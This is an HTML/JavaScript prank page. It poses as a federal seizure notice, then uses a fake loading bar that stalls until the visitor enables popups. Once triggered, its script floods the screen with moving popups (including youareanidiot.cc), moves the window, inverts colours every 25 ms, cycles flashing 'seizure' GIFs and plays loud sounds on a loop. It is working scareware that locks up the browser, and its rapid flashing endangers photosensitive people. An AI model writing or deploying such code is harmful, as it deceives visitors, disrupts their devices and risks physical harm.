<!DOCTYPE html>
<html>
<head>
    <title>Seized by Federal Authorities</title>
    <style>
        body { background: hsl(0, 0%, 0%); color: white; text-align: center; padding-top: 50px; font-family: sans-serif; }
        button { padding: 20px; font-size: 20px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 10px; }
    </style>
</head>
<body>
    <img src="./seized.png" alt="Seized" style="width: 100%; height: 100vh; object-fit: fill; margin-top: -60px;" id="seized">
    <script>
        (function () {
            // ----- RESET -----
            document.body.style.margin = "0";
            document.body.style.overflow = "hidden";
            document.body.style.background = "black";
        
            let popupAllowed = false;
            let popupRef = null;
            let progress = 0;
            let waiting = false;
        
            // ----- UI -----
            const loadingScreen = document.createElement("div");
            Object.assign(loadingScreen.style, {
                position: "fixed",
                inset: "0",
                background: "black",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
                zIndex: "999999",
                color: "white",
                fontFamily: "Arial"
            });
        
            const text = document.createElement("div");
            text.innerHTML = 'Loading... <span id="percent">0%</span>';
        
            const barContainer = document.createElement("div");
            Object.assign(barContainer.style, {
                width: "60%",
                height: "30px",
                border: "2px solid white",
                marginTop: "20px"
            });
        
            const bar = document.createElement("div");
            Object.assign(bar.style, {
                height: "100%",
                width: "0%",
                background: "lime",
                transition: "width 0.1s linear"
            });
        
            barContainer.appendChild(bar);
        
            const permissionText = document.createElement("div");
            permissionText.style.display = "none";
            permissionText.style.marginTop = "20px";
            permissionText.style.color = "yellow";
            permissionText.innerHTML = "Popups are required to continue<br>";
        
            const allowBtn = document.createElement("button");
            allowBtn.textContent = "Try Enable Popups";
            allowBtn.style.marginTop = "10px";
            allowBtn.style.padding = "10px 20px";
            allowBtn.style.cursor = "pointer";
        
            permissionText.appendChild(allowBtn);
        
            loadingScreen.appendChild(text);
            loadingScreen.appendChild(barContainer);
            loadingScreen.appendChild(permissionText);
            document.body.appendChild(loadingScreen);
        
            const percentSpan = text.querySelector("#percent");
        
            function updateBar() {
                bar.style.width = progress + "%";
                percentSpan.textContent = Math.floor(progress) + "%";
            }
        
            function simulate() {
                if (waiting) return;
        
                let speed = popupAllowed ? 5 : 2;
        
                if (!popupAllowed && progress >= 85) {
                    progress = 85;
                    waiting = true;
                    permissionText.style.display = "block";
                    updateBar();
                    return;
                }
        
                progress += Math.random() * speed;
        
                if (progress >= 100) {
                    progress = 100;
                    updateBar();
                    finish();
                    document.addEventListener('click', function() {
                        YouAreCooked();
                    });
                    return;
                }
        
                updateBar();
                setTimeout(simulate, 100);
            }
        
            allowBtn.onclick = function () {
                // MUST be inside click
                let testPopup = window.open("", "_blank", "width=300,height=150");
        
                if (!testPopup) {
                    // BLOCKED → stay frozen
                    alert(`
                    :(
                    Oops, it looks like
                    popups are still
                    blocked, please
                    try again but with
                    popups on.`);
                    return;
                }
        
                // SUCCESS
                popupAllowed = true;
                popupRef = testPopup;
        
                // Keep popup open but blank for now
                popupRef.document.write("<title>Loading...</title><p>Loading...</p>");
        
                // Resume loading (faster)
                waiting = false;
                permissionText.style.display = "none";
                simulate();
            };
        
            function finish() {
                loadingScreen.style.display = "none";
        
                if (popupRef && !popupRef.closed) {
                    popupRef.document.body.innerHTML = `
                        <div style="font-family: Arial; display:flex; justify-content:center; align-items:center; height:100%; text-align:center;">
                            <div>
                                <h2>Loading done</h2>
                                <p>schnitzel world beyond abyssal web</p>
                            </div>
                        </div>
                    `;
                } else {
                    alert("Popup was closed before finishing.");
                }
            }
        
            simulate();
        })();
        function speak(phrase) {
            var synth = window.speechSynthesis;
            if (typeof phrase !== 'string' || phrase.trim() === '') {
                phrase = getRandomArrayEntry(PHRASES);
            }
            var utter = new SpeechSynthesisUtterance(phrase);
            utter.pitch = 1;
            utter.rate = 1;
            utter.volume = 1;
            synth.speak(utter);
        }

        function YouAreCooked() {
            // Array of GIFs to cycle through
            var gifs = [
                "https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyM2tucDF0YTVhcmQyc25wNzk3ZnRpd3lxZGNubTdlMmhuNDZ1cmVtdCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/n6szplK2CnuJW/giphy.gif",
                "https://media.tenor.com/qiqoSDqxXW4AAAAM/cat-kitty.gif",
                "https://media.tenor.com/B7Xspzwl8q0AAAAM/disco-cat.gif",
                "https://i.pinimg.com/originals/f8/39/84/f839845d5a8f6634e206e22fe8fc780e.gif",
                "https://www.gifcen.com/wp-content/uploads/2023/11/hacker-gif-9.gif",
                "https://media.tenor.com/WgkKGco9UpgAAAAM/anonimus-dance.gif",
                "https://gifdb.com/images/high/ricardo-cyber-hacker-ls2ozvgqubju0ts1.gif",
                "https://media.tenor.com/3JBlOHJlT6QAAAAM/excited.gif",
                "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydXRkOXcwdnFiemY2eHMwcW82Z2ZseHJwenJ3eXhrazI3N2p0YWowZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/34PROuA0RrlvZHbh8r/200.gif",
                "https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUydXRkOXcwdnFiemY2eHMwcW82Z2ZseHJwenJ3eXhrazI3N2p0YWowZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/S2zkeFV1VwAlG/200w.gif",
                "https://fc01.deviantart.net/fs71/f/2010/042/a/6/SEIZURE_TIME_3_by_thehappyspaceman01.gif",
                "https://media1.tenor.com/m/ZAR8zC250b4AAAAd/ivorydevrimo-creepy.gif",
                "https://media1.tenor.com/m/CnwRtErsf3MAAAAC/billy-loomis-billy-wants-you.gif",
                "https://static.wikia.nocookie.net/unanything/images/4/43/Seizure-rainbow.gif/revision/latest/scale-to-width-down/400?cb=20100523045457",
                "https://media1.tenor.com/m/69KU6xt4WKwAAAAd/uw-u-discord.gif",
                "https://media1.tenor.com/m/bsAHJuzj_hMAAAAd/protogen-furry.gif"
            ];

            // Open popups and URLs
            window.open('lol1.html', '_blank');
            window.open('lol2.html', '_blank');
            window.open('lol3.html', '_blank');
            window.open('lol3.html', '_blank');
            window.open('lol3.html', '_blank');
            window.open('lol3.html', '_blank');
            window.open('lol4.html', '_blank');
            window.open('https://hurr-durr.cc/HURRRRRRRRRRRRRRRRR.html', '_blank');
            window.open('https://youareanidiot.cc/lol.html', '_blank');

            // Function to spawn a random popup
            function spawnRandom(eee) {
                var maxX = screen.availWidth - 400; // Adjust width as needed
                var maxY = screen.availHeight - 300; // Adjust height as needed
                var popup = window.open(eee + '.html', '_blank', 'width=400,height=300');
                if (!popup) {
                    alert("Popup blocked! Please allow popups for this site.");
                    return;
                }
                setTimeout(function() {
                    setInterval(function() {
                        popup.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
                    }, 30);
                }, 1100);
            }

            // Spawning and bouncing multiple popups
            setInterval(function() { spawnRandom("lol3"); }, 1000);
            spawnRandom("lol2");
            spawnRandom("lol4");
            spawnRandom("lol1");
            spawnRandom("popup");
            spawnRandom("https://youareanidiot.cc/lol");

            // Cycle through GIFs every second
            setInterval(function() {
                var randomGif = gifs[Math.floor(Math.random() * gifs.length)];
                document.getElementById('seized').src = randomGif;
            }, 1000);

            // Change body filter effect every 25ms
            setInterval(function() {
                document.body.style.filter = document.body.style.filter === 'invert(1)' ? 'invert(0)' : 'invert(1)';
                // Move window to a random position on screen
                window.moveTo(Math.floor(Math.random() * screen.width), Math.floor(Math.random() * screen.height));
            }, 25);

            // Open additional popups
            var win = 'win_';
            for (var i = 0; i < 8; i++) {
                win += Math.random().toString(16).substr(2, 6);
            }
            var scale = 300;
            var windowHandle = window.open('popup.html', 'Teleporter', 'width=' + scale + ',height=' + scale + ',resizable=no,toolbar=no,menubar=no,location=no,status=no');

            // Randomly move the additional popups
            var intervalId = setInterval(function() {
                var maxX = screen.availWidth - scale;
                var maxY = screen.availHeight - scale;

                windowHandle.moveTo(Math.floor(Math.random() * maxX), Math.floor(Math.random() * maxY));
                windowHandle.focus();
            }, 90);

            // Play random sound every 200ms
            var soundUrls = [
                "https://www.myinstants.com/media/sounds/fahhhhhhhhhhhhhh.mp3",
                "https://www.myinstants.com/media/sounds/whatsapp-bass-boosted.mp3",
                "https://www.myinstants.com/media/sounds/manifest.mp3",
                "https://github.com/ivorydevrimoalt/schnitzel/raw/refs/heads/main/ouuuuuuuuuuuugh.wav"
            ];

            function playRandomSound() {
                var randomIndex = Math.floor(Math.random() * soundUrls.length);
                var audio = new Audio(soundUrls[randomIndex]);
                audio.play().catch(function(e) { console.log("User interaction required first!"); });
            }

            setInterval(playRandomSound, 200);

            // Cycle through moon phases
            var f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'];
            var step = 0;

            setInterval(function() {
                var s = '';
                for (var i = 0; i < 50; i++) {
                    var phase = Math.floor(Math.sin((step / 5) - (i / 2)) * 4 + 4) % 8;
                    s += f[phase];
                }
                window.location.hash = s;
                step++;
            }, 70);
        }
    </script>
</body>
</html>
